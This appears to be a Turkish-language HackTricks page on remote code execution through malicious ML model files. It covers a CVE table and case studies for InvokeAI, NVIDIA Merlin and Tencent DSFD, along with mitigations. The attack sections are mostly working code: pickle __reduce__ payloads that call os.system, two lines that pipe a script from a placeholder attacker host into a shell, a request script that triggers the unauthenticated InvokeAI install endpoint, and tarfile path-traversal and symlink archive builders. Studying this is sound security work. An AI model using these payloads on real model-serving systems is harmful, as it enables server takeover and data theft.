# Modellerde RCE

{{#include ../banners/hacktricks-training.md}}

## RCE için modellerin yüklenmesi

Makine öğrenimi modelleri genellikle ONNX, TensorFlow, PyTorch vb. gibi farklı formatlarda paylaşılır. Bu modeller geliştiricilerin makinelerine veya üretim sistemlerine yüklenerek kullanılır. Genellikle modeller kötü amaçlı kod içermemelidir, ancak modelin amaçlanan bir özelliği veya model yükleme kütüphanesindeki bir zafiyet nedeniyle modelin sistemde rastgele kod çalıştırmak için kullanılabildiği bazı durumlar vardır.

Yazım anında bu tür zafiyetlere bazı örnekler şunlardır:

| **Framework / Araç**        | **Vulnerability (CVE if available)**                                                    | **RCE Vektörü**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load`'de güvensiz deserializasyon* **(CVE-2025-32434)**                                                              | Model checkpoint'inde kötü amaçlı pickle, kod yürütülmesine yol açar ( `weights_only` korumasını atlayarak)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirme kod yürütülmesine neden olur; yönetim API'sinde Java deserializasyon RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` aracılığıyla güvensiz checkpoint deserializasyonu **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint `load_model_trainer_states_from_checkpoint` sırasında pickle reducer tetikler → ML işçisinde kod yürütülmesi            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'den model yüklemek `yaml.unsafe_load` kullanır (kod yürütme) <br> **Lambda** katmanına sahip modelin yüklenmesi rastgele Python kodu çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Hazırlanmış `.tflite` model tam sayı taşmasına yol açar → heap bozulması (potansiyel RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ile model yüklemek, saldırganın `__reduce__` payload'u içeren pickle'ı yürütür                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *tartışmalı*                                                                              | `numpy.load` varsayılan olarak pickled object array'lerine izin veriyordu – kötü amaçlı `.npy/.npz` kod yürütmeyi tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizinden çıkabilir (rastgele dosyaları okuma) <br> Kötü amaçlı ONNX model tar'ı rastgele dosyaların üzerine yazabilir (RCE'ye yol açabilir) | |
| ONNX Runtime (tasarım riski)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Özel operatöre sahip model, saldırganın native kodunun yüklenmesini gerektirebilir; karmaşık model grafikleri mantığı suistimal ederek istenmeyen hesaplamaları çalıştırabilir   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkinken model-load API'sinin kullanılması, göreli yol atlamasına izin vererek dosya yazmaya olanak tanır (ör. RCE için `.bashrc`'yi üzerine yazma)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (birden çok heap overflow)                                                                         | Bozuk GGUF model dosyası parser'da heap buffer overflow'lara neden olur, kurban sistemde rastgele kod yürütmeyi mümkün kılar                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda katmanlı kötü amaçlı HDF5 (`.h5`) model yüklemede hâlâ çalıştırılır (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Others** (general)        | *Tasarım hatası* – Pickle serileştirmesi                                                                                         | Birçok ML aracı (ör. pickle tabanlı model formatları, Python `pickle.load`) model dosyalarına gömülü rastgele kodu mitigasyon yoksa çalıştırır | |

Ayrıca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi bazı Python pickle tabanlı modeller `weights_only=True` ile yüklenmezlerse sistemde rastgele kod çalıştırmak için kullanılabilir. Bu nedenle, tabloda listelenmemiş olsalar bile herhangi bir pickle tabanlı model bu tür saldırılara özellikle duyarlı olabilir.

### 🆕 InvokeAI `torch.load` aracılığıyla RCE (CVE-2024-12029)

`InvokeAI` Stable-Diffusion için popüler bir açık kaynak web arayüzüdür. Versiyonlar **5.3.1 – 5.4.2** kullanıcıların modelleri rastgele URL'lerden indirip yüklemelerine izin veren `/api/v2/models/install` REST endpoint'ini açığa çıkarır.

İçeride endpoint en sonunda şu çağrıyı yapar:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

Zafiyet **CVE-2024-12029** olarak sınıflandırıldı (CVSS 9.8, EPSS 61.17 %).

#### İstismar adımları

1. Kötü amaçlı bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Kontrolünüzdeki bir HTTP sunucusunda `payload.ckpt` dosyasını barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Zafiyetli endpoint'i tetikleyin (kimlik doğrulama gerekmez):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan InvokeAI sürecinin bağlamında kod yürütme elde eder.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılan olarak **false**)  
•  `/api/v2/models/install` saldırgan tarafından erişilebilir  
•  Sürecin shell komutları çalıştırma yetkisi var

#### Önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama varsayılan olarak `scan=True` ayarını yapar ve deserileştirmeden önce kötü amaçlı yazılım taraması uygular.  
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` kullanın veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardımcı fonksiyonunu tercih edin.  
* Model kaynakları için izin listeleri (allow-lists) / imzaları zorunlu kılın ve servisi en düşük ayrıcalıklarla çalıştırın.

> ⚠️ Unutmayın ki **herhangi bir** Python pickle tabanlı format (çoğu `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) güvenilmeyen kaynaklardan deserileştirilmesi doğası gereği güvensizdir.

---

Eski InvokeAI sürümlerini bir reverse proxy arkasında çalıştırmak zorundaysanız uygulanabilecek geçici bir önlem örneği:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE güvensiz `torch.load` aracılığıyla (CVE-2025-23298)

NVIDIA’nin Transformers4Rec (Merlin'in bir parçası) kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağıran güvensiz bir checkpoint loader'ı açığa çıkardı. `torch.load` Python `pickle`'a dayandığı için, saldırgan kontrollü bir checkpoint deserialization sırasında bir reducer aracılığıyla rastgele kod çalıştırabilir.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bu neden RCE'ye yol açar: Python `pickle`'da, bir obje bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir; bu, çağrılabilir bir nesne ve argümanlar döndürür. Bu callable unpickling sırasında çalıştırılır. Böyle bir obje bir checkpoint içinde varsa, herhangi bir weight kullanılmadan önce çalışır.

Minimal kötü niyetli checkpoint örneği:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Teslimat vektörleri ve etki alanı:
- Trojanize edilmiş checkpoints/models repos, buckets veya artifact registries aracılığıyla paylaşılıyor
- Checkpoint'leri otomatik yükleyen automated resume/deploy pipeline'ları
- Execution, training/inference worker'ları içinde gerçekleşir, sıklıkla yükseltilmiş ayrıcalıklarla (ör. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) doğrudan `torch.load()`'u `transformers4rec/utils/serialization.py` içinde uygulanmış sınırlı, allow-listed bir deserializer ile değiştirdi. Yeni loader türleri/alanları doğrular ve yükleme sırasında rastgele callables'ın çağrılmasını önler.

PyTorch checkpoints için savunma önerileri:
- Güvenilmeyen veriyi unpickle etmeyin. Mümkünse [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi non-executable formatları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` (yeni PyTorch sürümlerinde desteklenir) olduğundan emin olun veya Transformers4Rec yamasıyla benzer custom allow-listed unpickler kullanın.
- Model provenance/signatures uygulayın ve sandbox deserialization yapın (seccomp/AppArmor; non-root user; sınırlı FS ve ağ çıkışı yok).
- Checkpoint yükleme zamanında ML servislerinden beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını trace edin.

POC ve vulnerable/patch referansları:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Örnek – kötü amaçlı bir PyTorch modeli oluşturma

- Modeli oluştur:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Tencent FaceDetection-DSFD resnet'te Deserializasyon (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD ürünü, kullanıcı tarafından kontrol edilen verileri nesneye dönüştüren bir `resnet` endpoint'i açığa çıkarıyor. ZDI, uzaktan bir saldırganın kurbana kötü amaçlı bir sayfa/dosya yükletip hazırlanmış serileştirilmiş bir blob'un bu endpoint'e gönderilmesini sağlayabileceğini ve `root` olarak deserializasyonu tetikleyerek tam ele geçirmeye yol açabileceğini doğruladı.

İstismar akışı tipik pickle suistimalini yansıtıyor:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) aynı şekilde silahlandırılabilir; bunun iletimin HTTP, WebSocket üzerinden olması veya izlenen bir dizine bırakılan bir dosya olması fark etmez.

## Modeller ve Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), çoğu farklı AI framework'leri tarafından kullanılan model formatı arşivlere, genellikle `.zip`'e dayanır. Bu nedenle, bu formatlar kötüye kullanılarak path traversal saldırıları gerçekleştirilebilir ve modelin yüklendiği sistemden herhangi bir dosyanın okunmasına izin verilebilir.

Örneğin, aşağıdaki kodla yüklenirken `/tmp` dizininde bir dosya oluşturacak bir model yaratabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Veya aşağıdaki kodla, yüklenince `/tmp` dizinine bir symlink oluşturan bir model yaratabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derinlemesine: Keras .keras deserialization and gadget hunting

Detaylı bir rehber için .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8 ve post-fix gadget discovery inside the allowlist konusunda odaklı bir rehber için bakınız:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Kaynaklar

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
